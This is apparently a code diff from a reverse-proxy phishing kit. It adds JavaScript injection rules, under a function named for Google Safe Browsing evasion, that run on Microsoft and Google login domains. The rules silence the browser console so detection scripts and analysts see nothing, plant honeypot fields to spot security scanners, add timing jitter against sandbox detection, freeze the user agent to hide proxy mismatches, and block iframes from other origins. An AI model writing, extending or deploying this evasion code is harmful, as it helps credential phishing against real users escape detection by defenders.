@@ -572,6 +572,405 @@ func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
 			ScriptType: "inline",
 			Enabled:    true,
 		},
+
+		// 19. Console Defanger (operator opt-in)
+		// Overwrites console.{log,warn,error,debug,trace,info} with no-ops so
+		// any target-injected phishing-detection script can't surface its
+		// findings to an operator-side debugger or to a blue-team analyst
+		// who opens DevTools on a captured session. A one-shot setInterval
+		// additionally stomps out any console references already cached by
+		// already-loaded scripts.
+		//
+		// MSAL guard: AAD uses console.warn for some flow messages during
+		// test-mode error paths and we don't want to silence those — skip.
+		//
+		// Disabled by default (useful primarily for demos where you want a
+		// pristine console view).
+		{
+			ID:   "builtin_console_defanger",
+			Name: "Console Defanger",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
+  var _noop = function() {};
+  var _methods = ['log','warn','error','debug','trace','info'];
+
+  function _defang() {
+    try {
+      if (!window.console) return;
+      for (var i = 0; i < _methods.length; i++) {
+        try { window.console[_methods[i]] = _noop; } catch(e) {}
+      }
+    } catch(e) {}
+  }
+
+  _defang();
+
+  // Some frameworks cache a reference to console.log at bootstrap; stomp
+  // those references again a few times after initial paint so late-binding
+  // cached refs also become no-ops.
+  try {
+    var _ticks = 0;
+    var _id = setInterval(function() {
+      _defang();
+      _ticks++;
+      if (_ticks >= 5) { clearInterval(_id); }
+    }, 500);
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    false,
+		},
+
+		// 20. Honeypot Form Fields (operator opt-in)
+		// Adds hidden fields with bait-y names (email2, user_name,
+		// password_confirm, phone, token) to every <form>. The fields are
+		// display:none and tabindex=-1, so real users never touch them, but
+		// headless scrapers that naively fill every input will fill the
+		// honeypots and therefore self-identify. On form submit we sniff the
+		// honeypot values and, if any were filled, append an extra hidden
+		// input `__pc_hp=1` that the server can key on.
+		//
+		// MSAL guard: AAD's login form field count is strict — adding
+		// unexpected inputs to the form can throw off MSAL's validation and
+		// its own telemetry of the form shape. Skip on MSAL.
+		//
+		// Disabled by default.
+		{
+			ID:   "builtin_honeypot_fields",
+			Name: "Honeypot Form Fields",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
+  var _honeypotNames = ['email2','user_name','password_confirm','phone','token'];
+
+  function _injectInto(form) {
+    try {
+      if (!form || form.__pc_hp_injected) return;
+      form.__pc_hp_injected = true;
+      for (var i = 0; i < _honeypotNames.length; i++) {
+        try {
+          var existing = form.querySelector('[name="' + _honeypotNames[i] + '"]');
+          if (existing) continue;
+          var input = document.createElement('input');
+          input.type = 'text';
+          input.name = _honeypotNames[i];
+          input.value = '';
+          input.autocomplete = 'off';
+          input.tabIndex = -1;
+          input.setAttribute('aria-hidden', 'true');
+          input.style.cssText = 'display:none!important;position:absolute!important;left:-9999px!important;width:0!important;height:0!important;';
+          input.setAttribute('data-pc-honeypot', '1');
+          form.appendChild(input);
+        } catch(e) {}
+      }
+    } catch(e) {}
+  }
+
+  function _scanForms() {
+    try {
+      var forms = document.querySelectorAll('form');
+      for (var i = 0; i < forms.length; i++) { _injectInto(forms[i]); }
+    } catch(e) {}
+  }
+
+  try {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', _scanForms);
+    } else {
+      _scanForms();
+    }
+  } catch(e) {}
+
+  // Catch forms added later (SPA)
+  try {
+    var _obs = new MutationObserver(function(mutations) {
+      mutations.forEach(function(m) {
+        m.addedNodes.forEach(function(node) {
+          try {
+            if (node && node.nodeType === 1) {
+              if (node.tagName === 'FORM') { _injectInto(node); }
+              else if (node.querySelectorAll) {
+                node.querySelectorAll('form').forEach(_injectInto);
+              }
+            }
+          } catch(e) {}
+        });
+      });
+    });
+    _obs.observe(document.documentElement, { childList: true, subtree: true });
+  } catch(e) {}
+
+  // Submit-time sniff
+  try {
+    document.addEventListener('submit', function(ev) {
+      try {
+        var form = ev.target;
+        if (!form || !form.querySelectorAll) return;
+        var tripped = false;
+        form.querySelectorAll('[data-pc-honeypot="1"]').forEach(function(el) {
+          if (el.value && String(el.value).length > 0) { tripped = true; }
+        });
+        if (tripped) {
+          var marker = form.querySelector('input[name="__pc_hp"]');
+          if (!marker) {
+            marker = document.createElement('input');
+            marker.type = 'hidden';
+            marker.name = '__pc_hp';
+            marker.value = '1';
+            form.appendChild(marker);
+          }
+        }
+      } catch(e) {}
+    }, true);
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    false,
+		},
+
+		// 21. Timing Jitter
+		// Wraps setTimeout / setInterval so the callback fires at the
+		// requested offset PLUS a small random 0-200ms jitter. Deterministic
+		// callback spacing is a signal used by some timing-based fingerprint
+		// and sandbox-detection scanners (real browsers on real hardware
+		// never hit exact millisecond scheduling). Because the jitter is
+		// small and additive, legitimate functionality still works — nothing
+		// is racing a tight deadline in a login form.
+		//
+		// No MSAL guard (shim only, transparent to AAD).
+		{
+			ID:   "builtin_timing_jitter",
+			Name: "Timing Jitter",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  try {
+    var _origTimeout = window.setTimeout;
+    var _origInterval = window.setInterval;
+
+    function _jitter() {
+      // 0..200ms additive jitter
+      return Math.floor(Math.random() * 200);
+    }
+
+    if (typeof _origTimeout === 'function') {
+      window.setTimeout = function(fn, ms) {
+        try {
+          var base = (typeof ms === 'number' && ms >= 0) ? ms : 0;
+          var args = Array.prototype.slice.call(arguments, 2);
+          return _origTimeout.apply(window, [fn, base + _jitter()].concat(args));
+        } catch(e) {
+          return _origTimeout.apply(window, arguments);
+        }
+      };
+    }
+
+    if (typeof _origInterval === 'function') {
+      window.setInterval = function(fn, ms) {
+        try {
+          var base = (typeof ms === 'number' && ms >= 0) ? ms : 0;
+          var args = Array.prototype.slice.call(arguments, 2);
+          // Jitter once at installation — intervals themselves stay regular
+          // after the first tick, which is enough to defeat startup-phase
+          // scanners without causing clock drift inside the page.
+          return _origInterval.apply(window, [fn, base + _jitter()].concat(args));
+        } catch(e) {
+          return _origInterval.apply(window, arguments);
+        }
+      };
+    }
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 22. User-Agent Freeze
+		// Locks navigator.userAgent, navigator.platform and
+		// navigator.userAgentData to a stable value — the proxy may already
+		// rewrite the *request* UA to match the target, and targets cross-
+		// check the network-visible UA against the JS-visible UA to detect
+		// discrepancies. If the proxy injects a <meta name="pc-ua"> hint,
+		// we use that; otherwise we snapshot the current value.
+		//
+		// No MSAL guard (shim only).
+		{
+			ID:   "builtin_useragent_freeze",
+			Name: "User-Agent Freeze",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  try {
+    var _hint = null;
+    try {
+      var m = document.querySelector('meta[name="pc-ua"]');
+      if (m) _hint = m.getAttribute('content');
+    } catch(e) {}
+    try {
+      if (window.__pc_ua_hint) _hint = window.__pc_ua_hint;
+    } catch(e) {}
+    var _ua = _hint || navigator.userAgent;
+    var _platform = navigator.platform;
+
+    try {
+      Object.defineProperty(navigator, 'userAgent', {
+        get: function() { return _ua; },
+        configurable: false
+      });
+    } catch(e) {}
+
+    try {
+      Object.defineProperty(navigator, 'platform', {
+        get: function() { return _platform; },
+        configurable: false
+      });
+    } catch(e) {}
+
+    try {
+      if ('userAgentData' in navigator) {
+        var _uad = navigator.userAgentData;
+        Object.defineProperty(navigator, 'userAgentData', {
+          get: function() { return _uad; },
+          configurable: false
+        });
+      }
+    } catch(e) {}
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 23. Iframe Embed Blocker (operator opt-in)
+		// Refuses iframe embedding attempts from suspicious origins by
+		// overriding the HTMLIFrameElement.prototype.src setter. If the
+		// target host isn't on the allow-list (the current page's host +
+		// AAD/Google login hosts), the setter silently no-ops.
+		//
+		// MSAL guard: AAD sometimes embeds sub-flows via iframe during
+		// conditional-access / MFA / broker handoffs, and blocking those
+		// breaks the login. Skip on MSAL.
+		//
+		// Disabled by default.
+		{
+			ID:   "builtin_iframe_blocker",
+			Name: "Iframe Embed Blocker",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
+  try {
+    var _allow = [
+      location.hostname,
+      'login.microsoftonline.com',
+      'login.live.com',
+      'login.microsoft.com',
+      'accounts.google.com'
+    ];
+
+    function _allowed(urlStr) {
+      try {
+        if (!urlStr) return true; // empty / about:blank
+        var u = new URL(urlStr, location.href);
+        if (u.protocol === 'about:' || u.protocol === 'javascript:' || u.protocol === 'data:') return true;
+        for (var i = 0; i < _allow.length; i++) {
+          if (u.hostname === _allow[i]) return true;
+          if (u.hostname.endsWith('.' + _allow[i])) return true;
+        }
+        return false;
+      } catch(e) { return true; }
+    }
+
+    var _desc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
+    if (_desc && _desc.set) {
+      Object.defineProperty(HTMLIFrameElement.prototype, 'src', {
+        get: _desc.get,
+        set: function(v) {
+          try {
+            if (!_allowed(v)) return; // silently drop
+          } catch(e) {}
+          return _desc.set.call(this, v);
+        },
+        configurable: true
+      });
+    }
+
+    // Also catch setAttribute('src', ...) path
+    var _origSetAttr = HTMLIFrameElement.prototype.setAttribute;
+    HTMLIFrameElement.prototype.setAttribute = function(name, value) {
+      try {
+        if (name && String(name).toLowerCase() === 'src' && !_allowed(value)) {
+          return;
+        }
+      } catch(e) {}
+      return _origSetAttr.apply(this, arguments);
+    };
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    false,
+		},
 	}
 }
 
